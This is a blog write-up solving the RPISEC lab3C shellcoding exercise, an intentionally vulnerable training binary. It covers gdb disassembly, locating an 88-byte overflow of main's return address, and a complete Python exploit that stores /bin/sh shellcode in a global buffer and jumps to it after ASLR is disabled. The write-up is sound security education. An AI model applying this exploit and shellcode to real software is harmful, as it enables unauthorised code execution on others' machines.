---
layout: post
title: shellcode lab RPISEC
date: 2023-12-14 
description: rpisec lab3C
categories: rpisec bin-exp
---

### Solving lab3C "| 02/24 | --[ Shellcoding Lab" (https://github.com/RPISEC/MBE/blob/master/src/lab03/lab3C.c)

### This lab is a combination of buffer-overflow and shellcode. The intention os this lab is explore bof and execute a shellcode and get a shell on the machine where the binary is running. This time we will have the shell part.

First we go get the source code and compile following the instruction that is commented in the code:

```
gcc -z execstack -fno-stack-protector lab3C.c -o lab3C
```


Running the binary we see that it asks for a username. And when I try to enter any username, I get "incorrect username":

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/runbin.png" width="300" height="300" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Looking at the binary strings we see something interesting:

```
$ strings lab3C
```

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/binstrings.png" width="300" height="300" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>



We see that the binary also asks for a password and probably this password and the username appear right above.

We can also see a preview of the functions that binary uses:

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/binstrings2.png" width="100" height="100" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Testing the username and password I get a slightly strange result...

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/testuserpass.png" width="300" height="300" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


It seems that the username is correct but the password is not, or could it be that the binary doesn't do anything at all?


### After trying to understand what the binary does, now let's move on to debugging

First, let's take a look at the disassembly of the main function:

```sh
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000001201 <+0>:	endbr64 
   0x0000000000001205 <+4>:	push   rbp
   0x0000000000001206 <+5>:	mov    rbp,rsp
   0x0000000000001209 <+8>:	sub    rsp,0x50
   0x000000000000120d <+12>:	mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000001215 <+20>:	mov    QWORD PTR [rbp-0x48],0x0
   0x000000000000121d <+28>:	mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000001225 <+36>:	mov    QWORD PTR [rbp-0x38],0x0
   0x000000000000122d <+44>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000001235 <+52>:	mov    QWORD PTR [rbp-0x28],0x0
   0x000000000000123d <+60>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000001245 <+68>:	mov    QWORD PTR [rbp-0x18],0x0
   0x000000000000124d <+76>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001254 <+83>:	lea    rdi,[rip+0xdd5]        # 0x2030
   0x000000000000125b <+90>:	call   0x1090 <puts@plt>
   0x0000000000001260 <+95>:	lea    rdi,[rip+0xdf0]        # 0x2057
   0x0000000000001267 <+102>:	mov    eax,0x0
   0x000000000000126c <+107>:	call   0x10a0 <printf@plt>
   0x0000000000001271 <+112>:	mov    rax,QWORD PTR [rip+0x2da8]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x0000000000001278 <+119>:	mov    rdx,rax
   0x000000000000127b <+122>:	mov    esi,0x100
   0x0000000000001280 <+127>:	lea    rdi,[rip+0x2db9]        # 0x4040 <a_user_name>
   0x0000000000001287 <+134>:	call   0x10b0 <fgets@plt>
   0x000000000000128c <+139>:	mov    eax,0x0
   0x0000000000001291 <+144>:	call   0x11a9 <verify_user_name>
   0x0000000000001296 <+149>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001299 <+152>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x000000000000129d <+156>:	je     0x12b2 <main+177>
   0x000000000000129f <+158>:	lea    rdi,[rip+0xdc2]        # 0x2068
   0x00000000000012a6 <+165>:	call   0x1090 <puts@plt>
   0x00000000000012ab <+170>:	mov    eax,0x1
   0x00000000000012b0 <+175>:	jmp    0x1309 <main+264>
   0x00000000000012b2 <+177>:	lea    rdi,[rip+0xdcc]        # 0x2085
   0x00000000000012b9 <+184>:	call   0x1090 <puts@plt>
   0x00000000000012be <+189>:	mov    rdx,QWORD PTR [rip+0x2d5b]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x00000000000012c5 <+196>:	lea    rax,[rbp-0x50]
   0x00000000000012c9 <+200>:	mov    esi,0x64
   0x00000000000012ce <+205>:	mov    rdi,rax
   0x00000000000012d1 <+208>:	call   0x10b0 <fgets@plt>
   0x00000000000012d6 <+213>:	lea    rax,[rbp-0x50]
   0x00000000000012da <+217>:	mov    rdi,rax
   0x00000000000012dd <+220>:	call   0x11d7 <verify_user_pass>
   0x00000000000012e2 <+225>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000000012e5 <+228>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x00000000000012e9 <+232>:	je     0x12f1 <main+240>
   0x00000000000012eb <+234>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x00000000000012ef <+238>:	je     0x1304 <main+259>
   0x00000000000012f1 <+240>:	lea    rdi,[rip+0xd9e]        # 0x2096
   0x00000000000012f8 <+247>:	call   0x1090 <puts@plt>
   0x00000000000012fd <+252>:	mov    eax,0x1
   0x0000000000001302 <+257>:	jmp    0x1309 <main+264>
   0x0000000000001304 <+259>:	mov    eax,0x0
   0x0000000000001309 <+264>:	leave  
   0x000000000000130a <+265>:	ret    
End of assembler dump.
```

Analyzing we can see that in main there are two more functions: **verify_user_name** and **verify_user_pass**. These are probably the functions that check the name and password input.

And just before calling the function **verify_user_name** we can see that the username variable is referenced before calling a **fgets** which can take the name and store it in the variable. Now the function **verify_user_pass** does not have the password variable referenced before being called. This may mean that inputs are stored in different ways...


Looking at the disassembly of functions, we don't see much that is useful:

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/disasfuncs.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


We see that the functions probably take the input and do a comparison using the **strncmp** function. If we consider what we saw in the strings, these functions must compare the inputs with the values ​​"rpisec" and "admin".

### Now that we know what the binary does, we can do some tests to find the best path to shellcode, which is the idea of ​​this lab.


Following with what we already know, we first have to test whether any variable can be overflowed. Putting breakpoints in the verification functions right after the input goes to the binary and put a pattern on the inputs for see how it is handled.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/breakfuncs.png" width="300" height="300" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Let's use the alphabet pattern like in the previous lab, so we know when there was a memory leak:

```
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
```

After a few steps in **verify_user_name** we stop at the **strcmp** function call and see the comparison with the string "rpisec". And we can also notice that one of **strcmp** arguments is "6", which would be the number of bytes that the function will validate.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/verfname1.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


So the first 6 bytes of the input have to be "rpisec". This can be confirmed because after we go through **strncmp** the flow jumps to a comparison and then print "incorrect username".

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/incorrname.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Then the execution is finished.


### Passing verify_user_name

So if we put the string "rpisec" before the pattern we see that **strncpm** only reads the first 6 bytes and with this it is possible to pass the username check.


<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/passverifname.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


After passing the username verification we arrive at the **verify_user_pass** function. And we can see the password verification being done:

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/verifpass1.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


As expected, after passing **strncmp** the flow jumps to a comparison and then to the end, but... 

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/incorrpass.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


I noticed that no return address was overwritten, neither from **verify_user_name** or **verify_user_pass**. Until we reached the return address of the main function, which got stuck because it was overwritten by our alphabet patter.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/retmain.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


We can notice that after 88 bytes of the pattern the return address of main is overwritten. 

```
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNN
|			88 bytes is stored in variable				       ||  this is overflowed  |       
|______________________________________________________________________________________||______________________|
```

We have our buffer-overflow!


### Shellcode time


There came a time when I tried to put some shellcodes after the return address of the main function but I didn't achieve anything. I was stuck for a while trying different ways and nothing.

Until I asked for help and received tips on a better path to follow.

In the source code, the variable that stores the username is outside the scope of the functions, that is, it is in the global scope. This means that it is in the .data section of the binary and not in the .text section where it is the executable area.

With this we can know that the username variable will not be stored in the stack, but the password variable will. So the tip I received was to store the shellcode in the username variable and overwrite the return address in the password variable. To then "get" the shellcode in the username variable and thus execute it.


### Let's go

If we look at the disassembly of the main function we see that the address of the username variable is referenced before being passed to the **fgets** function and then to the **verify_user_name** function.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/usrnmvar1.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


And checking the variable's memory we see the string "rpisec".

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/usrnmvar2.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Now knowing the address of the username variable and also how to overwrite the return address, let's write our exploit...


```py
import struct

name = b"rpisec"

# addr a_user_name var that store username + 6 bytes to the shellcode addr
nameaddr = 0x555555558086

# 88 bytes to overflow
pattern = b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKK"

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

nm = struct.pack('<Q', nameaddr)

buf = b''
buf += name		# pass in verify_user_name function
buf += shellcode        # /bin/sh shellcode
buf += b'\n'		# break line to align the buffer
buf += pattern          # buffer to overflow password var
buf += nm		# addr of shellcode in name var


f = open("exp", "wb")
f.write(buf)
```

(shellcode source: https://shell-storm.org/shellcode/files/shellcode-806.html)


After running the python code it sends the buffer to an "exp" file. And the exploration buffer looks like this:


<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/expfile.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>



```sh
rpisec + shellcode + pattern + addr of shellcode
```

### Shell time

After running we can see that the shellcode has been stored along with the rpisec string.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/shellcode1.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Arriving at the ret main we see that the return address was successfully overwritten.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/shellcode2.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


Then we see that the shellcode address has been reached and the shellcode instructions are being executed successfully.

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/shellcode3.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>



With everything ok in GDB, let's run the exploit outside the debugger to get the shell on the machine. For execution outside of gdb to work, it will be necessary to disable ASLR so that the host machine does not randomize memory addresses.


```
$ sudo sysctl kernel.randomize_va_space=0
```

(disable aslr)


Running the binary along with the exploit... we have the shell

<div class="col-sm mt-3 mt-md-0">
   {% include figure.liquid loading="eager" path="assets/img/pwned.png" class="img-fluid rounded z-depth-1" zoomable=true %}
</div>


It was difficult but it worked. :)
